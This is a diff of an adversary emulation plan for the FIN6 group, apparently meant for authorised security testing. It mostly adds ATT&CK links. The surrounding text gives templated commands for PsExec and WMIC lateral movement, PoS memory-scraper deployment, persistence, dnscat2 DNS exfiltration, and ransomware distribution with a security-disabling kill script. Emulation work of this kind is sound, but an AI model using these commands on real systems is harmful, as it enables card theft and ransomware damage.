@@ -8,7 +8,15 @@ During Discovery, FIN6 identifies systems of interest.  Depending on your organi
 * Your objectives for Phase 2 are to deploy, execute, and persist an operational capability on a system of interest identified during Discovery.
 * The operational capability should be deployed with the intent of assessing the liklihood of exfiltrating POS data, harvesting payment information from a web server, or deploying ransomware.
 
-# Execution
+## Contents
+
+* [Scenario 1 - Attacking Point of Sale (POS) Systems](#scenario-1---attacking-point-of-sale-pos-systems)
+
+* [Scenario 2 - Attacking E-Commerce Platforms](#scenario-2---attacking-e-commerce-platforms)
+
+* [Scenario 3 - Deploying Ransomware](#scenario-3---deploying-ransomware)
+
+---
 
 ## Scenario 1 - Attacking Point of Sale (POS) Systems
 
@@ -16,13 +24,13 @@ The lateral movement described herein describes lateral movement to systems of i
 
 The operational capability we will be emulating for this scenario is PoS malware.  You are encouraged to use a memory scraper of your choosing.  We have opted to use [mem_scraper](https://github.com/Shellntel/scripts/blob/master/mem_scraper.ps1).  This PowerShell script continuously dumps a process's memory and subsequently scrapes it for track data.  So as to remain operationally representative (name-wise), we used PS2EXE to compile the script into Assistant32.exe.<sup>[5](https://exchange.xforce.ibmcloud.com/threat-group/f8409554b71a79792ff099081bc5ac24)</sup> <sup>[7](https://blog.morphisec.com/new-global-attack-on-point-of-sale-systems)</sup>
 
-Additional file names (T1036.005) used by FIN6 include:<sup>[5](https://exchange.xforce.ibmcloud.com/threat-group/f8409554b71a79792ff099081bc5ac24)</sup>
+Additional file names ([T1036.005](https://attack.mitre.org/techniques/T1036/005)) used by FIN6 include:<sup>[5](https://exchange.xforce.ibmcloud.com/threat-group/f8409554b71a79792ff099081bc5ac24)</sup>
 
 ```sh
 logmesvc.exe, ttfmgr.exe, powershell.exe, dspsvc.exe, logmeinlauncher.exe, and POSreport.exe, PnPXAssoc.exe
 ```
 
-Additional service names (T1036.004) used by FIN6 in persisting PoS malware:<sup>[5](https://exchange.xforce.ibmcloud.com/threat-group/f8409554b71a79792ff099081bc5ac24)</sup>
+Additional service names ([T1036.004](https://attack.mitre.org/techniques/T1036/004/)) used by FIN6 in persisting PoS malware:<sup>[5](https://exchange.xforce.ibmcloud.com/threat-group/f8409554b71a79792ff099081bc5ac24)</sup>
 
 ```sh
 #{AV} Management Instrumentation, BFHlpr / Base Filtering Helper, hdmsv c/ Windows Hardware Management Driver, TrueType Fonts Management Service, and LogMeInServer
@@ -32,9 +40,9 @@ Additional service names (T1036.004) used by FIN6 in persisting PoS malware:<sup
 
 #### 5.1 Lateral movement to PoS system using a Command and Control (C2) Framework.<sup>[4](https://www.fireeye.com/blog/threat-research/2019/04/pick-six-intercepting-a-fin6-intrusion.html)</sup> <sup>[9](https://securityintelligence.com/posts/more_eggs-anyone-threat-actor-itg08-strikes-again/)</sup> <sup>[13](https://usa.visa.com/dam/VCOM/global/support-legal/documents/fin6-cybercrime-group-expands-threat-To-ecommerce-merchants.pdf)</sup>
 
-Metasploit PsExec - PowerShell (T1059.001, T1569.002)
+##### Metasploit PsExec - PowerShell ([T1059.001](https://attack.mitre.org/techniques/T1059/001/))
 
-##### FIN6 Procedure
+FIN6 Procedure
 
 ```sh
 msf> use exploit/windows/smb/psexec
@@ -46,29 +54,29 @@ msf exploit(psexec) > set SMBUser #{User}
 msf exploit(psexec) > exploit
 ```
 
-CobaltStrike PowerShell PsExec (T1059.001, T1569.002)
+##### CobaltStrike PowerShell PsExec ([T1059.001](https://attack.mitre.org/techniques/T1059/001/), [T1569.002](https://attack.mitre.org/techniques/T1569/002/))
 
-##### FIN6 Procedure
+FIN6 Procedure
 
 ```sh
 beacon> jump psexec_psh #{PoS system}
 ```
 
-CobaltStrike - Remote Exec (T1059.001, T1047)
+##### CobaltStrike - Remote Exec ([T1047](https://attack.mitre.org/techniques/T1047/), [T1569.002](https://attack.mitre.org/techniques/T1569/002/))
 
 ```sh
 remote-exec wmi #{PoS system}
 ```
 
-#### 5.2 Deploy POS implant to harvest POS data.
+#### 5.2 Deploy POS implant to harvest POS data
 
 ```sh
 meterpreter>upload #{Assistant32.exe} C:\Windows\temp
 ```
 
-#### 5.3 Executing the POS implant using WMIC (T1047)
+#### 5.3 Executing the POS implant using WMIC ([T1047](https://attack.mitre.org/techniques/T1047/))
 
-##### FIN6 Procedure
+FIN6 Procedure
 
 ```sh
 wmic /node:#{"PoS system"} process call create #{"executable"}
@@ -78,11 +86,11 @@ wmic /node:#{"PoS system"} process call create #{"executable"}
 Example: wmic /node:"192.168.101.1" process call create "c:\windows\temp\Assistant32.exe -Proc iexplore"
 ```
 
-### 5.4 Persistence <sup>[3](https://www2.fireeye.com/rs/848-DID-242/images/rpt-fin6.pdf)</sup> <sup>[5](https://exchange.xforce.ibmcloud.com/threat-group/f8409554b71a79792ff099081bc5ac24)</sup> <sup>[7](https://blog.morphisec.com/new-global-attack-on-point-of-sale-systems)</sup> <sup>[9](https://securityintelligence.com/posts/more_eggs-anyone-threat-actor-itg08-strikes-again)</sup>
+#### 5.4 Persistence <sup>[3](https://www2.fireeye.com/rs/848-DID-242/images/rpt-fin6.pdf)</sup> <sup>[5](https://exchange.xforce.ibmcloud.com/threat-group/f8409554b71a79792ff099081bc5ac24)</sup> <sup>[7](https://blog.morphisec.com/new-global-attack-on-point-of-sale-systems)</sup> <sup>[9](https://securityintelligence.com/posts/more_eggs-anyone-threat-actor-itg08-strikes-again)</sup>
 
-#### Registry Run Keys (T1547.001)
+##### Registry Run Keys ([T1547.001](https://attack.mitre.org/techniques/T1547/001/))
 
-##### FIN6 Procedure (T1218.001) - DLL
+FIN6 Procedure - DLL
 
 ```sh
 "C:\Windows\System32\reg.exe" ADD "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v #{ } /t REG_SZ /d #{ } "C:\#{ },#{ } /f
@@ -92,15 +100,15 @@ Example: wmic /node:"192.168.101.1" process call create "c:\windows\temp\Assista
 Example: "C:\Windows\System32\reg.exe" ADD "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "Windows Help Assistant" /t REG_SZ /d "rundll32.exe "C:\Windows\SysWOW64\0409\Assistant.dll",workerInstance" /f
 ```
 
-##### Alternative Procedure - EXE
+Alternative Procedure - EXE
 
 ```sh
 "C:\Windows\System32\reg.exe" ADD "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "Windows Help Assistant" /t REG_SZ /d "C:\Windows\temp\Assistant32.exe" /f
 ```
 
-Scheduled Task (T1053.005)
+##### Scheduled Task ([T1053.005](https://attack.mitre.org/techniques/T1053/005/))
 
-##### FIN6 Procedure (T1218.001) - DLL
+FIN6 Procedure - DLL
 
 ```sh
 "C:\Windows\System32\schtasks.exe" /create /tn #{ } /tr "rundll32.exe "C:\#{ }",#{ }" /sc #{ } /ru System
@@ -110,25 +118,25 @@ Scheduled Task (T1053.005)
 Example: "C:\Windows\System32\schtasks.exe" /create /tn WindowsHelpAssistant /tr "rundll32.exe "C:\Windows\SysWOW64\0409\Assistant32.dll",workerInstance" /sc onstart /ru System
 ```
 
-##### Alternative Procedure - EXE
+Alternative Procedure - EXE
 
 ```sh
 Example: "C:\Windows\System32\schtasks.exe" /create /tn WindowsHelpAssistant /tr "c:\windows\temp\Assistant32.exe" /sc onstart /ru System
 ```
 
-Service Creation (T1543.003)
+##### Service Creation ([T1543.003](https://attack.mitre.org/techniques/T1543/003/))
 
-##### FIN6 Procedure
+FIN6 Procedure
 
 ```sh
 sc create "Windows Help Assistant" binpath="c:\windows\temp\Assistant32.exe" start="auto" obj="LocalSystem"
 ```
 
-#### 5.5 - PoS data exfiltration over DNS tunnel (T1048.003) <sup>[5](https://exchange.xforce.ibmcloud.com/threat-group/f8409554b71a79792ff099081bc5ac24)</sup> <sup>[7](https://blog.morphisec.com/new-global-attack-on-point-of-sale-systems)</sup>
+#### 5.5 - PoS data exfiltration over DNS tunnel ([T1048.003](https://attack.mitre.org/techniques/T1048/003/)) <sup>[5](https://exchange.xforce.ibmcloud.com/threat-group/f8409554b71a79792ff099081bc5ac24)</sup> <sup>[7](https://blog.morphisec.com/new-global-attack-on-point-of-sale-systems)</sup>
 
-##### Alternative Procedure
+Alternative Procedure
 
-dnscat2 Server
+##### dnscat2 Server
 
 ```sh
 ruby dnscat2.rb --dns="domain=#{ }" --no cache
@@ -138,7 +146,7 @@ ruby dnscat2.rb --dns="domain=#{ }" --no cache
 Example: ruby dnscat2.rb --dns="domain=example.com" --no cache
 ```
 
-dnscat2 PowerShell Client
+##### dnscat2 PowerShell Client
 
 ```sh
 Start-Dnscat2 -Domain #{dnscat2 server} Exec cmd
@@ -150,15 +158,15 @@ Start-Dnscat2 -Domain #{dnscat2 server} Exec cmd
 
 FIN6 is suspected of being responsible for the Magecart Group 6 activity.<sup>[10](https://blog.trendmicro.com/trendlabs-security-intelligence/fin6-compromised-e-commerce-platform-via-magecart-to-inject-credit-card-skimmers-into-thousands-of-online-shops/)</sup>  Magecart Group 6 is responsible for targeting high-volume E-commerce sites and exfiltrating payment data to an infrastructure that mimics that of the victim.  The group had a great deal of success in injecting Magecart scripts into legitimate 3rd party JavaScript libraries, thereby compromising the check-out process for thousands of E-commerce companies.<sup>[10](https://blog.trendmicro.com/trendlabs-security-intelligence/fin6-compromised-e-commerce-platform-via-magecart-to-inject-credit-card-skimmers-into-thousands-of-online-shops/)</sup>  FIN6 is also suspected of accomplishing enabling objectives in order to move laterally throughout an organization with the intent of gaining access to web servers.<sup>[13](https://usa.visa.com/dam/VCOM/global/support-legal/documents/fin6-cybercrime-group-expands-threat-To-ecommerce-merchants.pdf)</sup>  Once on a web server, the group modifies libraries to include custom Magecart scripts.
 
-For organizations that are not in favor of injecting scripts into operational payment servers, we recommend the following.  Assess your ability to move laterally within your network from a "compromised" host to the payment server.  Assess your ability to gain unauthorized access and write to the server.  Simulate exfiltration by manually issuing an HTTP POST with simulated credit card information to your exfiltration server.    
+For organizations that are not in favor of injecting scripts into operational payment servers, we recommend the following.  Assess your ability to move laterally within your network from a "compromised" host to the payment server.  Assess your ability to gain unauthorized access and write to the server.  Simulate exfiltration by manually issuing an HTTP POST with simulated credit card information to your exfiltration server.
 
 ### Procedures
 
 #### 6.1 Lateral Movement Using C2 Frameworks<sup>[4](https://www.fireeye.com/blog/threat-research/2019/04/pick-six-intercepting-a-fin6-intrusion.html)</sup> <sup>[9](https://securityintelligence.com/posts/more_eggs-anyone-threat-actor-itg08-strikes-again/)</sup>
 
-Metasploit PsExec - PowerShell (T1059.001, T1569.002)
+##### Metasploit PsExec - PowerShell ([T1059.001](https://attack.mitre.org/techniques/T1059/001/), [T1569.002](https://attack.mitre.org/techniques/T1569/002/))
 
-##### FIN6 Procedure
+FIN6 Procedure
 
 ```sh
 msf> use exploit/windows/smb/psexec
@@ -170,15 +178,15 @@ msf exploit(psexec) > set SMBUser #{User}
 msf exploit(psexec) > exploit -j
 ```
 
-CobaltStrike PowerShell PsExec (T1059.001, T1569.002)
+##### CobaltStrike PowerShell PsExec ([T1059.001](https://attack.mitre.org/techniques/T1059/001), [T1569.002](https://attack.mitre.org/techniques/T1569/002/))
 
-##### FIN6 Procedure
+FIN6 Procedure
 
 ```sh
 beacon> jump psexec_psh #{Web Server}
 ```
 
-CobaltStrike Remote Exec (T1059.001, T1047)
+##### CobaltStrike Remote Exec ([T1059.001](https://attack.mitre.org/techniques/T1059/001), [T1047](https://attack.mitre.org/techniques/T1047))
 
 ```sh
 remote-exec wmi #{Web Server}
@@ -247,15 +255,15 @@ You are encouraged to use a ransomware simulator of your choosing.  We have opte
 
 ### Procedures
 
-#### 7.1 Copy kill script (kill.bat/windows.bat), distribution script (xaa.bat, xab.bat, xac.bat, etc.), and ransomware (sss.exe) to the distribution server.<sup>[4](https://www.fireeye.com/blog/threat-research/2019/04/pick-six-intercepting-a-fin6-intrusion.html)</sup> <sup>[12](https://www.fireeye.com/blog/threat-research/2020/05/tactics-techniques-procedures-associated-with-maze-ransomware-incidents.html)</sup>
+#### 7.1 Copy kill script (kill.bat/windows.bat), distribution script (xaa.bat, xab.bat, xac.bat, etc.), and ransomware (sss.exe) to the distribution server. ([T1047](https://attack.mitre.org/techniques/T1047/)) ([T1059.003](https://attack.mitre.org/techniques/T1059/003/)) <sup>[4](https://www.fireeye.com/blog/threat-research/2019/04/pick-six-intercepting-a-fin6-intrusion.html)</sup> <sup>[12](https://www.fireeye.com/blog/threat-research/2020/05/tactics-techniques-procedures-associated-with-maze-ransomware-incidents.html)</sup>
 
-Strings from xaa.bat:
+##### Strings from xaa.bat:
 
 ```sh
 wmic /node:#{Ransomware recipient} /user:#{"domain\username"} /password:#{"password"} process call create "cmd.exe /c copy \\#{internal IP}\c$\windows\temp\sss.exe c:\windows\temp\"
 ```
+Kill.bat disables security products and alters firewall configs using binaries native to Windows.  ([T1562.001](https://attack.mitre.org/techniques/T1562/001), [T1562.004](https://attack.mitre.org/techniques/T1059/004))
 
-Kill.bat disables security products and alters firewall configs using binaries native to Windows.  (T1562.001, T1562.004)
 Strings from kill.bat:
 
 ```sh
@@ -268,25 +276,25 @@ taskkill /IM #{ } /F
 netsh #{ }
 ```
 
-Copy the ransomware to the distribution server.
+##### Copy the ransomware to the distribution server
 
-##### FIN6 Procedure
+FIN6 Procedure
 
 ```sh
 copy sss.exe \\#{Distribution Server}\c$\windows\temp\
 ```
 
-Copy the distribution scripts to the distribution server.
+##### Copy the distribution scripts to the distribution server
 
-##### FIN6 Procedure
+FIN6 Procedure
 
 ```sh
 copy xaa.bat \\#{Distribution Server}\c$\windows\temp\
 ```
 
-Copy the kill script to the distribution server.
+##### Copy the kill script to the distribution server.
 
-##### FIN6 Procedure
+FIN6 Procedure
 
 ```sh
 copy windows.bat \\#{Distribution Server}\c$\windows\temp\
@@ -294,17 +302,17 @@ copy windows.bat \\#{Distribution Server}\c$\windows\temp\
 copy kill.bat \\#{Distribution Server}\c$\windows\temp\
 ```
 
-#### 7.2 Distribute the ransomware and kill script to the intended targets.<sup>[12](https://www.fireeye.com/blog/threat-research/2020/05/tactics-techniques-procedures-associated-with-maze-ransomware-incidents.html)</sup>
+#### 7.2 Distribute the ransomware and kill script to the intended targets. ([T1047](https://attack.mitre.org/techniques/T1047/)) ([T1059.003](https://attack.mitre.org/techniques/T1059/003/)) <sup>[12](https://www.fireeye.com/blog/threat-research/2020/05/tactics-techniques-procedures-associated-with-maze-ransomware-incidents.html)</sup>
 
-xaa.bat
+##### xaa.bat
 
-##### FIN6 Procedure
+FIN6 Procedure
 
 ```sh
 wmic /node:#{internal IP} /user:#{"domain\username"} /password:#{"password"} process call create "cmd.exe /c copy \\#{internal IP}\c$\windows\temp\sss.exe c:\windows\temp\"
 ```
 
-##### FIN6 Procedure
+FIN6 Procedure
 
 ```sh
 wmic /node:#{internal IP} /user:#{"domain\username"} /password:#{"password"} process call create "cmd.exe /c copy \\#{internal IP}\c$\windows\temp\windows.bat or kill.bat c:\windows\temp\"
@@ -312,39 +320,39 @@ wmic /node:#{internal IP} /user:#{"domain\username"} /password:#{"password"} pro
 
 #### 7.3 Execute the kill script and then the ransomware.<sup>[12](https://www.fireeye.com/blog/threat-research/2020/05/tactics-techniques-procedures-associated-with-maze-ransomware-incidents.html)</sup>
 
-#### WMIC (T1047)
+#### WMIC ([T1047](https://attack.mitre.org/techniques/T1047/))
 
-Kill Script
+##### Kill Script
 
-##### FIN6 Procedure
+FIN6 Procedure
 
 ```sh
 wmic /node:#{Ransomware recipient} /user:#{"domain\username"} /password:#{"password"} process call create "cmd /c c:\windows\temp\windows.bat" or "kill.bat"
 ```
 
-Ransomware
+##### Ransomware
 
-##### FIN6 Procedure
+FIN6 Procedure
 
 ```sh
 wmic /node:#{Ransomware recipient} /user:#{"domain\username"} /password:#{"password"} process call create "cmd /c c:\windows\temp\sss.exe"
 ```
 
-#### PsExec
+#### PsExec ([T1569.002](https://attack.mitre.org/techniques/T1569/002/))
 
 FIN6 has used the -r option to change the default remote service name in order to avoid detection.  The group is believed to have named the remote services "mstdc" or "rtrsd."<sup>[4](https://www.fireeye.com/blog/threat-research/2019/04/pick-six-intercepting-a-fin6-intrusion.html)</sup>  The command below authenticates over SMB, executes a command or binary, and returns the results locally.
 
-Kill Script
+##### Kill Script
 
-##### FIN6 Procedure
+FIN6 Procedure
 
 ```sh
 psexec.exe \\#{internal IP} -u #{"domain\username"} -p #{"password"} -d -h -r rtrsd -s -accepteula -nobanner c:\windows\temp\windows.bat or kill.bat
 ```
 
-Ransomware
+##### Ransomware
 
-##### FIN6 Procedure
+FIN6 Procedure
 
 ```sh
 psexec.exe \\#{internal IP} -u #{"domain\username"} -p #{"password"} -d -h -r rtrsd -s -accepteula -nobanner c:\windows\temp\sss.exe
